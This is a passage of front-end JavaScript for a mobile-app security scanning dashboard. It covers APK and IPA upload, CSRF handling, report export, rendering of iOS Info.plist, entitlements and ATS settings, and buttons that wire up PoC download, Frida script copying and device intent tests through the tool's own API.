      init.headers = Object.assign({}, init.headers || {}, {'X-Vexa-Csrf': tok});
    }
  }
  let resp = await window._origFetch(input, init);
  if (resp.status === 401 && !isLogin){
    // Session expired -> kick to login
    try { sessionStorage.removeItem('vexa_csrf'); } catch (_) {}
    location.href = '/login';
    return resp;
  }
  if (resp.status === 403 && isWrite && !isLogin){
    // CSRF token may have been invalidated; refresh and retry once
    _CSRF_TOKEN = null;
    const tok = await ensureCsrf();
    if (tok){
      init.headers = Object.assign({}, init.headers || {}, {'X-Vexa-Csrf': tok});
      resp = await window._origFetch(input, init);
    }
  }
  return resp;
};

async function downloadReport(format){
  if (!STATE.scanId) return;
  const url = '/api/scan/' + STATE.scanId + '/report.' + format;
  // HEAD probe to catch 503 missing-dep before forcing a download
  try {
    const r = await fetch(url, {method: 'GET'});
    if (r.status === 503){
      const j = await r.json().catch(() => ({}));
      alert('Cannot generate ' + format.toUpperCase() + ' report:\n\n' + (j.detail || 'Missing dependency'));
      return;
    }
    if (!r.ok){
      alert('Report generation failed (HTTP ' + r.status + ')');
      return;
    }
    const blob = await r.blob();
    const dl = document.createElement('a');
    dl.href = URL.createObjectURL(blob);
    dl.download = 'vexa-' + (STATE.report?.metadata?.package || STATE.scanId) + '.' + format;
    document.body.appendChild(dl); dl.click();
    setTimeout(() => { URL.revokeObjectURL(dl.href); dl.remove(); }, 1000);
  } catch (e) {
    alert('Download error: ' + e.message);
  }
}

const STATE = {
  scanId: null,
  report: null,
  pocs: [],
  devices: [],
  health: null,
  selectedFinding: null,
  chat: [],
};

// ====== Initialisation ======
async function init(){
  await refreshHealth();
  await refreshScans();
  bind();
  setInterval(updateClock, 1000); updateClock();
}

function updateClock(){
  $('#sb-time').textContent = new Date().toLocaleTimeString();
}

async function refreshHealth(){
  try{
    STATE.health = await (await fetch('/api/health')).json();
  } catch(e){ STATE.health = {}; }
  const adb = STATE.health.adb, ol = STATE.health.ollama;
  const saved = STATE.health.saved_scans ?? 0;
  $('#env-pills').innerHTML =
    `<div class="env-pill on"><span class="dot"></span>${saved} saved scan${saved===1?'':'s'}</div>` +
    `<div class="env-pill ${adb?'on':'off'}"><span class="dot"></span>adb ${adb?'detected':'missing'}</div>` +
    `<div class="env-pill ${ol?'on':'off'}"><span class="dot"></span>ollama ${ol?(STATE.health.ollama_models?.length||0)+' model(s)':'off'}</div>`;
}

async function refreshScans(){
  try{
    const r = await (await fetch('/api/scans')).json();
    const wrap = $('#scan-list');
    let list = r.scans || [];
    // Apply platform filter (set by the All / 🤖 / 🍎 pills)
    const filter = STATE.scanPlatformFilter || 'all';
    if (filter === 'android') list = list.filter(s => (s.platform || 'Android') === 'Android');
    else if (filter === 'ios') list = list.filter(s => s.platform === 'iOS');
    if (!list.length){
      const filterMsg = filter === 'all'
        ? 'No saved scans yet.<br><span style="color:var(--muted-2);font-size:10px">Reports auto-save to ' + esc(STATE.health?.data_dir || 'vexa_data/') + '</span>'
        : `No ${filter === 'ios' ? 'iOS' : 'Android'} scans saved yet.`;
      wrap.innerHTML = '<div class="dim" style="padding:12px;font-size:11px;text-align:center">' + filterMsg + '</div>';
      return;
    }
    wrap.innerHTML = list.map(s => {
      const summ = s.summary || {};
      const total = (summ.critical||0) + (summ.high||0) + (summ.medium||0) + (summ.low||0);
      const bar = total ? `<div class="severity-bar">
        ${summ.critical ? `<span class="sev-c" style="flex:${summ.critical}"></span>` : ''}
        ${summ.high     ? `<span class="sev-h" style="flex:${summ.high}"></span>` : ''}
        ${summ.medium   ? `<span class="sev-m" style="flex:${summ.medium}"></span>` : ''}
        ${summ.low      ? `<span class="sev-l" style="flex:${summ.low}"></span>` : ''}
      </div>` : '';
      const active = s.scan_id === STATE.scanId ? 'active' : '';
      const platIcon = s.platform === 'iOS' ? '🍎' : '🤖';
      return `<div class="scan-item ${active}" data-id="${s.scan_id}" title="${esc(s.filename || '')}">
        <div class="scan-item-content">
          <div class="pkg">${platIcon} ${esc(s.package || s.filename || s.scan_id)}</div>
          <div class="meta">${(summ.critical||0)+(summ.high||0)} crit/high · ${esc(new Date(s.mtime*1000).toLocaleDateString())}</div>
          ${bar}
        </div>
        <button class="scan-item-del" data-del="${s.scan_id}" title="Delete this scan">×</button>
      </div>`;
    }).join('');
    // Click on body -> load scan
    $$('.scan-item-content').forEach(el => el.onclick = () => loadScan(el.parentElement.dataset.id));
    // Click on × -> delete with confirmation
    $$('[data-del]').forEach(el => el.onclick = async (e) => {
      e.stopPropagation();
      const sid = el.dataset.del;
      const item = el.parentElement;
      const name = item.querySelector('.pkg')?.textContent?.trim() || sid;
      if (!confirm(`Delete scan "${name}"?\n\nThis removes the report, the original APK/IPA, and any saved PoCs.\nThis cannot be undone.`)) return;
      try {
        const dr = await fetch('/api/scan/' + sid, {method: 'DELETE'});
        if (!dr.ok){
          const j = await dr.json().catch(() => ({}));
          alert('Delete failed: ' + (j.detail || 'HTTP ' + dr.status));
          return;
        }
        // If the deleted scan is currently loaded, return to welcome
        if (sid === STATE.scanId){
          STATE.scanId = null;
          STATE.report = null;
          showWelcome();
        }
        refreshScans();
      } catch (e) { alert('Error: ' + e.message); }
    });
  } catch(e){
    console.error('refreshScans failed:', e);
    $('#scan-list').innerHTML = '<div class="dim" style="padding:8px 12px;font-size:11px;color:var(--bad)">Error loading scans: ' + esc(e.message) + '</div>';
  }
}

// ====== Bindings ======
function bind(){
  // Drop zone
  const dz = $('#dz'), fi = $('#fi');
  dz.onclick = () => fi.click();
  fi.onchange = e => e.target.files[0] && uploadAPK(e.target.files[0]);
  ['dragenter','dragover'].forEach(ev => dz.addEventListener(ev, e => { e.preventDefault(); dz.classList.add('over'); }));
  ['dragleave','drop'].forEach(ev => dz.addEventListener(ev, e => { e.preventDefault(); dz.classList.remove('over'); }));
  dz.addEventListener('drop', e => e.dataTransfer.files[0] && uploadAPK(e.dataTransfer.files[0]));

  // Sidebar nav
  $$('.nav-item').forEach(el => el.onclick = () => switchView(el.dataset.view));
  $('#new-scan-btn').onclick = () => { STATE.scanId = null; STATE.report = null; showWelcome(); };
  if ($('#refresh-scans')) $('#refresh-scans').onclick = (e) => { e.stopPropagation(); refreshScans(); };
  if ($('#reports-filter')) $('#reports-filter').oninput = () => loadReportsTab();
  if ($('#reports-refresh')) $('#reports-refresh').onclick = () => loadReportsTab();

  // Saved-scan platform filter (All / 🤖 Android / 🍎 iOS)
  $$('.scan-filter-btn').forEach(btn => btn.onclick = () => {
    $$('.scan-filter-btn').forEach(b => b.classList.toggle('active', b === btn));
    STATE.scanPlatformFilter = btn.dataset.platformFilter;
    refreshScans();
  });
  // ===== Theme toggle =====
  (function(){
    const btn = $('#btn-theme');
    const saved = localStorage.getItem('vexa_theme') || 'dark';
    applyTheme(saved);
    if(btn) btn.onclick = () => {
      const cur = document.documentElement.getAttribute('data-theme') || 'dark';
      applyTheme(cur === 'dark' ? 'light' : 'dark');
    };
    function applyTheme(t){
      document.documentElement.setAttribute('data-theme', t);
      localStorage.setItem('vexa_theme', t);
      if(btn) btn.textContent = t === 'dark' ? '☀' : '🌙';
      if(btn) btn.title = t === 'dark' ? 'Switch to light theme' : 'Switch to dark theme';
    }
  })();

  $('#btn-logout').onclick = async () => {
    try { await fetch('/api/logout', {method:'POST'}); } catch(e) {}
    location.href = '/login';
  };

  // Source tabs (file vs URL)
  $$('.src-tab').forEach(el => el.onclick = () => {
    $$('.src-tab').forEach(t => t.classList.toggle('active', t === el));
    const src = el.dataset.src;
    $('#src-pane-file').style.display = (src === 'file') ? '' : 'none';
    $('#src-pane-url').style.display  = (src === 'url')  ? '' : 'none';
  });

  // Platform tabs (Android / iOS) -- updates dropzone hints + URL placeholder
  // The actual platform is auto-detected from filename (.apk vs .ipa) on upload,
  // but the visual hint helps users pick the right input format.
  $$('.plat-tab').forEach(el => el.onclick = () => {
    $$('.plat-tab').forEach(t => t.classList.toggle('active', t === el));
    const plat = el.dataset.platform;
    STATE.uploadPlatform = plat;
    if (plat === 'ios') {
      $('#dz-title').textContent = 'Drop IPA';
      $('#dz-sub').textContent = 'iOS .ipa — or click to browse';
      $('#fi').setAttribute('accept', '.ipa');
      $('#store-url').placeholder = 'https://apps.apple.com/…/id…';
      $('#url-hint').innerHTML = '<b>iOS:</b> App Store IPAs are FairPlay-encrypted — we fetch metadata only and provide download instructions.';
      // De-emphasize the Android cap card
      $('#cap-android')?.classList.add('cap-dimmed');
      $('#cap-ios')?.classList.remove('cap-dimmed');
    } else {
      $('#dz-title').textContent = 'Drop APK';
      $('#dz-sub').textContent = 'Android .apk — or click to browse';
      $('#fi').setAttribute('accept', '.apk');
      $('#store-url').placeholder = 'https://play.google.com/store/apps/details?id=…';
      $('#url-hint').innerHTML = '<b>Android:</b> auto-downloads via public mirror (best-effort, may fail for some apps).';
      $('#cap-ios')?.classList.add('cap-dimmed');
      $('#cap-android')?.classList.remove('cap-dimmed');
    }
  });

  // Fetch from store URL
  $('#btn-fetch-url').onclick = async () => {
    const url = ($('#store-url').value || '').trim();
    const status = $('#url-status');
    if (!url) { showUrlStatus('error', 'Please paste a Play Store or App Store URL.'); return; }
    showUrlStatus('working', 'Resolving URL and attempting fetch...\n(this can take 10-60 seconds)');
    showFunnyProgress(5, "Looking up the store URL...");
    // Slowly animate funny bar from 5 to 90 over 60s while we wait
    let cur = 5;
    const ticker = setInterval(() => {
      cur += (90 - cur) * 0.025;
      if (cur >= 89) clearInterval(ticker);
      showFunnyProgress(cur);
    }, 800);
    $('#btn-fetch-url').disabled = true;
    try {
      const r = await fetch('/api/scan/url', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({url})
      });
      clearInterval(ticker);
      const data = await r.json();
      if (!r.ok) {
        hideFunnyProgress();
        showUrlStatus('error', data.detail || 'Fetch failed.');
        return;
      }
      if (data.type === 'metadata_only') {
        hideFunnyProgress();
        // iOS App Store: show metadata + download instructions
        let m = data.metadata || {};
        let info = `App: ${m.name || '?'}  v${m.version || '?'}\n`
          + `Bundle ID: ${m.bundle_id || '?'}\n`
          + `Developer: ${m.developer || '?'}\n`
          + `Min iOS: ${m.min_os || '?'}  ·  Size: ${m.size_bytes ? (m.size_bytes/1024/1024).toFixed(1) + ' MB' : '?'}\n`
          + `Rating: ${m.rating || '?'} (${m.rating_count || 0} reviews)\n`
          + `Released: ${m.release_date ? m.release_date.substring(0,10) : '?'}\n\n`
          + (data.message || '');
        showUrlStatus('working', info);
        return;
      }
      if (data.scan_id && data.report) {
        showFunnyProgress(100, "✓ Done. Loading report...");
        showUrlStatus('success', `Downloaded ${data.report.metadata?.package || ''}  -  loading scan...`);
        STATE.scanId = data.scan_id;
        STATE.report = data.report;
        STATE.chat = [];
        setTimeout(() => hideFunnyProgress(), 700);
        renderScan();
        refreshScans();
        refreshHealth();
      }
    } catch (e) {
      clearInterval(ticker);
      hideFunnyProgress();
      showUrlStatus('error', 'Network error: ' + e.message);
    } finally {
      $('#btn-fetch-url').disabled = false;
    }
  };
  function showUrlStatus(kind, text) {
    const el = $('#url-status');
    el.className = 'url-status ' + (kind || '');
    el.textContent = text;
    el.style.display = 'block';
  }

  // Header buttons
  $('#btn-json').onclick = () => STATE.scanId && (location.href = '/api/scan/' + STATE.scanId + '/report.json');
  $('#btn-html').onclick = () => STATE.scanId && window.open('/api/scan/' + STATE.scanId + '/report.html', '_blank');
  $('#btn-pocs-zip').onclick = () => STATE.scanId && (location.href = '/api/scan/' + STATE.scanId + '/pocs/zip');
  $('#ex-json').onclick = () => $('#btn-json').click();
  $('#ex-html').onclick = () => $('#btn-html').click();
  $('#ex-zip').onclick = () => $('#btn-pocs-zip').click();
  // PDF / DOCX / XLSX
  if ($('#ex-pdf')) $('#ex-pdf').onclick = () => downloadReport('pdf');
  if ($('#ex-docx')) $('#ex-docx').onclick = () => downloadReport('docx');
  if ($('#ex-xlsx')) $('#ex-xlsx').onclick = () => downloadReport('xlsx');

  // Findings filter
  $('#f-search').oninput = renderFindings;
  $('#f-sev').onchange = renderFindings;
  $('#f-cat').onchange = renderFindings;
  $('#detail-close').onclick = () => closeDetail();

  // PoCs
  $('#poc-zip-btn').onclick = () => $('#btn-pocs-zip').click();
  $('#poc-verify-btn').onclick = verifyPocs;

  // Frida
  $$('[data-frida]').forEach(b => b.onclick = () => loadFrida(b.dataset.frida));
  $('#frida-copy').onclick = () => {
    navigator.clipboard.writeText($('#frida-code').textContent);
    $('#frida-copy').textContent = '✓ Copied';
    setTimeout(() => $('#frida-copy').textContent = '⎘ Copy', 1500);
  };

  // Dynamic
  $('#dyn-refresh').onclick = loadDevices;
  $('#dyn-run').onclick = runDynamic;
  $('#dyn-install').onclick = installAPK;
  $('#dyn-uninstall').onclick = uninstallAPK;

  // Dynamic — quick actions
  $$('[data-quick]').forEach(btn => {
    btn.onclick = () => quickAction(btn.dataset.quick, btn);
  });

  // Dynamic — targeted activity test
  if ($('#dyn-activity-go')){
    $('#dyn-activity-go').onclick = () => {
      const act = $('#dyn-activity-pick').value;
      if (!act) return alert('No activity selected');
      runActivityTest(act);
    };
  }
  // Dynamic — deeplink trigger
  if ($('#dyn-deeplink-go')){
    $('#dyn-deeplink-go').onclick = () => {
      const uri = $('#dyn-deeplink-uri').value.trim();
      if (!uri) return alert('Enter a URI');
      runDeeplinkTest(uri);
    };
    $('#dyn-deeplink-pick').onchange = () => {
      if ($('#dyn-deeplink-pick').value){
        $('#dyn-deeplink-uri').value = $('#dyn-deeplink-pick').value;
      }
    };
  }
  // Dynamic — custom intent
  if ($('#dyn-intent-go')){
    $('#dyn-intent-go').onclick = () => sendCustomIntent();
  }
  // Dynamic — logcat
  if ($('#dyn-logcat-go')){
    $('#dyn-logcat-go').onclick = () => quickAction('logcat', null, '#dyn-logcat');
    $('#dyn-logcat-clear').onclick = () => { $('#dyn-logcat').textContent = ''; };
  }

  // Chat
  $('#chat-form').onsubmit = sendChat;
  $('#chat-input').onkeydown = e => {
    if (e.key === 'Enter' && !e.shiftKey){ e.preventDefault(); $('#chat-form').requestSubmit(); }
  };
  $$('.chip').forEach(c => c.onclick = () => {
    $('#chat-input').value = c.dataset.q || c.textContent;
    $('#chat-form').requestSubmit();
  });

  // Global keyboard shortcuts
  document.addEventListener('keydown', (e) => {
    // Don't intercept when typing in inputs
    const tag = (e.target.tagName || '').toLowerCase();
    const inField = tag === 'input' || tag === 'textarea' || e.target.isContentEditable;

    // ESC: close detail panel / modal
    if (e.key === 'Escape'){
      if ($('#findings-layout')?.classList.contains('detail-open')){
        closeDetail();
      }
      return;
    }
    if (inField) return;

    // / to focus the findings search
    if (e.key === '/'){
      e.preventDefault();
      if (STATE.scanId){
        document.querySelector('[data-view=findings]')?.click();
        setTimeout(() => $('#f-search')?.focus(), 60);
      }
    }
    // 1-9 to switch tabs (Findings, Manifest, Components, etc.)
    const tabKeys = {
      'g': 'overview', 'f': 'findings', 'm': 'manifest', 'c': 'components',
      'd': 'deeplinks', 'p': 'permissions', 's': 'secrets', 'a': 'advisor',
      'o': 'pocs', 'h': 'chat', 'e': 'export',
    };
    if (e.key in tabKeys && STATE.scanId){
      document.querySelector(`[data-view=${tabKeys[e.key]}]`)?.click();
    }
  });
}

// ====== View switching ======
function switchView(view){
  // Reports tab accessible even without a scan loaded -- shows all saved scans
  if (view === 'reports'){
    $('#welcome').style.display = 'none';
    $('#scan-view').style.display = 'flex';
    $$('.nav-item').forEach(el => el.classList.toggle('active', el.dataset.view === view));
    $$('.view-pane').forEach(p => p.classList.remove('active'));
    $('#pane-reports')?.classList.add('active');
    loadReportsTab();
    return;
  }
  if (!STATE.scanId && view !== 'welcome'){ showWelcome(); return; }
  $$('.nav-item').forEach(el => el.classList.toggle('active', el.dataset.view === view));
  $$('.view-pane').forEach(p => p.classList.remove('active'));
  $('#pane-' + view)?.classList.add('active');
  if (view === 'chat') checkChat();
  if (view === 'dynamic') loadDevices();
  if (view === 'manifest') loadManifestTab();
  if (view === 'components') renderComponents(STATE.report?.metadata || {});
  // iOS-specific views
  if (view === 'ios-info-plist') renderIosInfoPlist();
  if (view === 'ios-entitlements') renderIosEntitlements();
  if (view === 'ios-url-schemes') renderIosUrlSchemes();
  if (view === 'ios-ats') renderIosAts();
}

// ====== iOS-specific renderers ======
function renderIosInfoPlist(){
  const r = STATE.report; if (!r) return;
  const plist = r.extras?.info_plist || r.metadata?.info_plist || {};
  const html = `<h2>Info.plist</h2>
    <p style="color:var(--text2);font-size:13px">Top-level Info.plist keys parsed from the IPA.</p>
    ${Object.keys(plist).length === 0
      ? '<div class="empty-state">No Info.plist data captured for this scan.</div>'
      : '<div class="kv-table">' + Object.entries(plist).map(([k,v]) =>
          `<div class="kv-row"><div class="kv-key">${esc(k)}</div><div class="kv-val">${esc(typeof v === 'object' ? JSON.stringify(v, null, 2) : String(v))}</div></div>`
        ).join('') + '</div>'
    }`;
  $('#pane-ios-info-plist').innerHTML = html;
}

function renderIosEntitlements(){
  const r = STATE.report; if (!r) return;
  const ents = r.extras?.entitlements || {};
  const html = `<h2>Entitlements</h2>
    <p style="color:var(--text2);font-size:13px">Capabilities the app declares (App Groups, Keychain access groups, push, etc.). Each one expands attack surface.</p>
    ${Object.keys(ents).length === 0
      ? '<div class="empty-state">No entitlements parsed.</div>'
      : '<div class="kv-table">' + Object.entries(ents).map(([k,v]) =>
          `<div class="kv-row"><div class="kv-key">${esc(k)}</div><div class="kv-val">${esc(typeof v === 'object' ? JSON.stringify(v, null, 2) : String(v))}</div></div>`
        ).join('') + '</div>'
    }`;
  $('#pane-ios-entitlements').innerHTML = html;
}

function renderIosUrlSchemes(){
  const r = STATE.report; if (!r) return;
  const schemes = r.extras?.url_schemes || [];
  const universal = r.extras?.universal_links || [];
  const queryable = r.extras?.queryable_schemes || [];
  let html = `<h2>URL Schemes &amp; Universal Links</h2>
    <p style="color:var(--text2);font-size:13px">Custom URL schemes are open invocation surface — any other app on the device can invoke them. Validate <code>options[.sourceApplication]</code> on every entry point.</p>`;

  html += '<h3 style="margin-top:18px">Custom URL Schemes</h3>';
  html += schemes.length === 0
    ? '<div class="empty-state">No CFBundleURLSchemes declared.</div>'
    : '<ul>' + schemes.map(s => `<li><code>${esc(s)}://</code></li>`).join('') + '</ul>';

  html += '<h3 style="margin-top:18px">Universal Links (associated domains)</h3>';
  html += universal.length === 0
    ? '<div class="empty-state">No associated domains declared.</div>'
    : '<ul>' + universal.map(u => `<li><code>${esc(u)}</code></li>`).join('') + '</ul>';

  if (queryable.length > 0) {
    html += '<h3 style="margin-top:18px">LSApplicationQueriesSchemes (other apps this app probes)</h3>';
    html += '<ul>' + queryable.map(q => `<li><code>${esc(q)}</code></li>`).join('') + '</ul>';
  }
  $('#pane-ios-url-schemes').innerHTML = html;
}

function renderIosAts(){
  const r = STATE.report; if (!r) return;
  const ats = r.extras?.ats || (r.metadata?.info_plist?.NSAppTransportSecurity) || {};
  const exceptions = ats.NSExceptionDomains || {};
  const allowsArbitrary = ats.NSAllowsArbitraryLoads === true;

  let html = `<h2>App Transport Security</h2>
    <p style="color:var(--text2);font-size:13px">ATS is iOS's TLS / cleartext-traffic policy. Exceptions weaken security per-domain.</p>`;

  html += '<div class="box" style="margin:14px 0">';
  html += `<div><b>NSAllowsArbitraryLoads:</b> <span style="color:${allowsArbitrary ? 'var(--severity-high)' : 'var(--severity-info)'}">${allowsArbitrary ? '⚠ true (bypasses ATS globally)' : 'false (default — good)'}</span></div>`;
  if (ats.NSAllowsArbitraryLoadsInWebContent !== undefined) {
    html += `<div><b>NSAllowsArbitraryLoadsInWebContent:</b> ${esc(String(ats.NSAllowsArbitraryLoadsInWebContent))}</div>`;
  }
  if (ats.NSAllowsLocalNetworking !== undefined) {
    html += `<div><b>NSAllowsLocalNetworking:</b> ${esc(String(ats.NSAllowsLocalNetworking))}</div>`;
  }
  html += '</div>';

  html += '<h3 style="margin-top:18px">Per-domain exceptions</h3>';
  if (Object.keys(exceptions).length === 0) {
    html += '<div class="empty-state">No NSExceptionDomains entries — ATS applies to all hosts.</div>';
  } else {
    html += '<table class="masvs-table"><thead><tr><th>Domain</th><th>Min TLS</th><th>Allows HTTP</th><th>Forward Secrecy</th></tr></thead><tbody>';
    for (const [domain, settings] of Object.entries(exceptions)) {
      const minTls = settings.NSExceptionMinimumTLSVersion || 'TLSv1.2 (default)';
      const allowsHttp = settings.NSExceptionAllowsInsecureHTTPLoads === true;
      const fs = settings.NSExceptionRequiresForwardSecrecy !== false;
      const tlsBad = (minTls === 'TLSv1.0' || minTls === 'TLSv1.1');
      html += `<tr>
        <td><code>${esc(domain)}</code></td>
        <td style="color:${tlsBad ? 'var(--severity-high)' : ''}">${esc(minTls)}</td>
        <td style="color:${allowsHttp ? 'var(--severity-high)' : ''}">${allowsHttp ? '⚠ yes' : 'no'}</td>
        <td>${fs ? 'yes' : '⚠ no'}</td>
      </tr>`;
    }
    html += '</tbody></table>';
  }
  $('#pane-ios-ats').innerHTML = html;
}

function showWelcome(){
  $('#welcome').style.display = 'flex';
  $('#scan-view').style.display = 'none';
  $$('.nav-item').forEach(el => el.classList.remove('active'));
  $('#sb-package').textContent = '';
  $('#sb-version').textContent = '';
}

// ====== Upload ======
function setProgress(p){
  const s = $('#progress-strip');
  if (p == null){ s.classList.remove('on'); return; }
  s.classList.add('on');
  s.firstElementChild.style.width = p + '%';
}

// ====== Funny upload overlay ======
const FUNNY_UPLOAD_MSGS = [
  // 0-15% — uploading bytes
  ["Convincing bytes to leave their cozy disk...", "Bribing the network packets...", "Negotiating with TCP...", "Asking nicely for an MTU..."],
  // 15-35% — still uploading
  ["Bytes are forming an orderly queue...", "Whispering sweet nothings to the socket...", "Stuffing 1s and 0s into the tube..."],
  // 35-50% — uploading done
  ["Last byte just boarded the plane...", "All bytes accounted for...", "Manifest accepted by ground crew..."],
  // 50-65% — parsing
  ["Cracking open the APK like a coconut...", "Asking androguard to do its magic...", "Unzipping with style...", "Reading the AndroidManifest like a bedtime story..."],
  // 65-80% — analyzing
  ["Interrogating each Activity...", "Sniffing for hardcoded API keys...", "Frisking the WebViews...", "Dusting Intent filters for fingerprints...", "Cross-examining cipher suites..."],
  // 80-95% — finalizing
  ["Cross-referencing with the CVE database in my brain...", "Calculating CVSS scores by candlelight...", "Sorting findings by 'oh no' factor...", "Drafting your incident report..."],
  // 95-100% — done
  ["Polishing the report...", "Tying ribbons on the findings..."],
];

function pickFunny(percent){
  let bucket = 0;
  if (percent >= 95) bucket = 6;
  else if (percent >= 80) bucket = 5;
  else if (percent >= 65) bucket = 4;
  else if (percent >= 50) bucket = 3;
  else if (percent >= 35) bucket = 2;
  else if (percent >= 15) bucket = 1;
  const arr = FUNNY_UPLOAD_MSGS[bucket];
  return arr[Math.floor(Math.random() * arr.length)];
}

let funnyTicker = null;
function showFunnyProgress(percent, customMsg){
  let m = $('#funny-modal');
  if (!m){
    document.body.insertAdjacentHTML('beforeend', `
      <div id="funny-modal" class="funny-modal">
        <div class="funny-card">
          <div class="funny-spinner">
            <svg viewBox="0 0 32 32" width="60" height="60"><defs><linearGradient id="fg-grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#58a6ff"/><stop offset="100%" stop-color="#1f4a8c"/></linearGradient></defs><path d="M16 2 L27.5 8.3 L27.5 23.7 L16 30 L4.5 23.7 L4.5 8.3 Z" fill="url(#fg-grad)" stroke="rgba(255,255,255,0.15)" stroke-width="0.5"/><path d="M10 12 L16 22 L22 12" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/><circle cx="16" cy="22" r="1.5" fill="#fff"/></svg>
          </div>
          <div class="funny-percent" id="funny-percent">0%</div>
          <div class="funny-bar"><div id="funny-bar-fill"></div></div>
          <div class="funny-msg" id="funny-msg">Warming up...</div>
        </div>
      </div>`);
    m = $('#funny-modal');
  }
  m.classList.add('on');
  const p = Math.min(100, Math.max(0, percent));
  $('#funny-percent').textContent = Math.floor(p) + '%';
  $('#funny-bar-fill').style.width = p + '%';
  if (customMsg) $('#funny-msg').textContent = customMsg;
  if (!funnyTicker){
    funnyTicker = setInterval(() => {
      const cur = parseFloat($('#funny-bar-fill').style.width) || 0;
      $('#funny-msg').textContent = pickFunny(cur);
    }, 1800);
  }
}

function hideFunnyProgress(){
  const m = $('#funny-modal');
  if (m) m.classList.remove('on');
  if (funnyTicker){ clearInterval(funnyTicker); funnyTicker = null; }
}

async function uploadAPK(file){
  const lname = file.name.toLowerCase();
  if (!lname.endsWith('.apk') && !lname.endsWith('.ipa')){ alert('Please drop a .apk (Android) or .ipa (iOS) file'); return; }
  $('#sb-status').innerHTML = '<span class="dot warn"></span>uploading…';
  setProgress(2);
  showFunnyProgress(2, "Bracing for impact...");
  const fd = new FormData(); fd.append('file', file);
  const x = new XMLHttpRequest();
  x.open('POST', '/api/scan');
  // Inject CSRF token (XMLHttpRequest bypasses our fetch wrapper)
  const csrfTok = await ensureCsrf();
  if (csrfTok) x.setRequestHeader('X-Vexa-Csrf', csrfTok);
  x.upload.onprogress = e => {
    if (e.lengthComputable){
      const pct = e.loaded/e.total*50;
      setProgress(Math.min(50, pct));
      showFunnyProgress(pct);
    }
  };
  x.upload.onload = () => {
    $('#sb-status').innerHTML = '<span class="dot warn"></span>analysing…';
    animProgress(50, 95, 30000);
    // Independently animate the funny bar to match
    let cur = 50;
    const t = setInterval(() => {
      cur += (95 - cur) * 0.05;
      if (cur >= 94 || !funnyTicker) { clearInterval(t); return; }
      showFunnyProgress(cur);
    }, 700);
  };
  x.onload = () => {
    if (x.status >= 200 && x.status < 300){
      setProgress(100);
      showFunnyProgress(100, "✓ Done. Loading report...");
      const d = JSON.parse(x.responseText);
      STATE.scanId = d.scan_id; STATE.report = d.report; STATE.chat = [];
      setTimeout(() => { setProgress(null); hideFunnyProgress(); }, 700);
      $('#sb-status').innerHTML = '<span class="dot on"></span>ready';
      renderScan();
      refreshScans();
      refreshHealth();
    } else {
      setProgress(null);
      hideFunnyProgress();
      let detail = x.responseText;
      try { detail = JSON.parse(x.responseText).detail || detail; } catch(e){}
      alert('Scan failed: ' + detail);
      $('#sb-status').innerHTML = '<span class="dot warn"></span>error';
    }
  };
  x.onerror = () => { setProgress(null); hideFunnyProgress(); alert('Network error'); };
  x.send(fd);
}

let progressTimer = null;
function animProgress(from, to, ms){
  if (progressTimer) clearInterval(progressTimer);
  let cur = from, step = (to - from) / (ms/200);
  progressTimer = setInterval(() => {
    cur += step;
    if (cur >= to){ clearInterval(progressTimer); progressTimer = null; cur = to; }
    setProgress(cur);
  }, 200);
}

async function loadScan(sid){
  try{
    const r = await (await fetch('/api/scan/' + sid)).json();
    STATE.scanId = sid; STATE.report = r; STATE.chat = [];
    renderScan(); refreshScans();
  } catch(e){ alert('Failed to load: ' + e.message); }
}

// ====== Render scan ======
function renderScan(){
  const r = STATE.report;
  $('#welcome').style.display = 'none';
  $('#scan-view').style.display = 'flex';
  const m = r.metadata || {};
  const platform = r.platform || (m.min_os ? 'iOS' : 'Android');
  const platEl = $('#vh-platform');
  platEl.textContent = platform === 'iOS' ? '🍎 iOS' : '🤖 Android';
  platEl.className = 'platform-pill ' + platform.toLowerCase();

  // Toggle Android-only vs iOS-only sidebar sections based on the loaded scan
  const isIos = (platform === 'iOS');
  document.querySelectorAll('.platform-android-only').forEach(el => {
    el.style.display = isIos ? 'none' : '';
  });
  document.querySelectorAll('.platform-ios-only').forEach(el => {
    el.style.display = isIos ? '' : 'none';
  });
  // Update body class for any platform-specific CSS hooks
  document.body.classList.toggle('platform-ios', isIos);
  document.body.classList.toggle('platform-android', !isIos);

  // Update iOS-specific sidebar badges
  if (isIos) {
    const ents = r.extras?.entitlements || {};
    $('#badge-ios-ents').textContent = Object.keys(ents).length || 0;
    const schemes = r.extras?.url_schemes || [];
    $('#badge-ios-schemes').textContent = schemes.length || 0;
  }

  $('#vh-title').textContent = m.package || '(unknown)';
  const meta = [];
  if (m.version_name) meta.push('v' + m.version_name + (m.version_code ? ' ('+m.version_code+')' : ''));
  if (m.min_sdk) meta.push((platform === 'iOS' ? 'iOS ≥ ' : 'minSdk ') + m.min_sdk);
  if (m.target_sdk) meta.push('targetSdk ' + m.target_sdk);
  if (m.apk_size_bytes) meta.push((m.apk_size_bytes/1024/1024).toFixed(1) + ' MB');
  if (r.scan_duration_seconds) meta.push('scanned in ' + r.scan_duration_seconds + 's');
  $('#vh-meta').textContent = meta.join('  ·  ');

  $('#sb-package').textContent = m.package || '';
  $('#sb-version').textContent = m.version_name ? 'v'+m.version_name : '';

  const s = r.summary || {};
  $('#kpi-strip').innerHTML = ['critical','high','medium','low','info'].map(k =>
    `<div class="kpi ${k.slice(0,4)}"><span class="value">${s[k] || 0}</span><span class="label">${k}</span></div>`
  ).join('');

  $('#badge-findings').textContent = (r.findings || []).length;
  $('#badge-deeplinks').textContent = (r.extras?.deeplinks || []).length;
  const secretCount = (r.findings || []).filter(f =>
    (f.id||'').startsWith('secret-') || (f.id||'').startsWith('ios-secret-')).length;
  $('#badge-secrets').textContent = secretCount;

  renderOverview(m, r);
  renderFindings();
  renderSecrets();
  // Components and Manifest tabs are loaded lazily on click (see switchView)
  _COMPONENTS_DATA = null;
  _MANIFEST_DATA = null;
  renderDeeplinks(r.extras?.deeplinks || []);
  renderPermissions(r.extras?.permissions || []);
  loadAdvisor();
  loadPocs();

  // Update permissions badge
  if ($('#badge-permissions')) $('#badge-permissions').textContent = (r.extras?.permissions || []).length;
  // Components count: derive from metadata as a fast estimate (real count comes from manifest endpoint)
  const totalComp = (m.activities||[]).length + (m.services||[]).length + (m.receivers||[]).length + (m.providers||[]).length;
  if ($('#badge-components')) $('#badge-components').textContent = totalComp;

  switchView('overview');
}

// ====== Overview ======
function renderOverview(m, r){
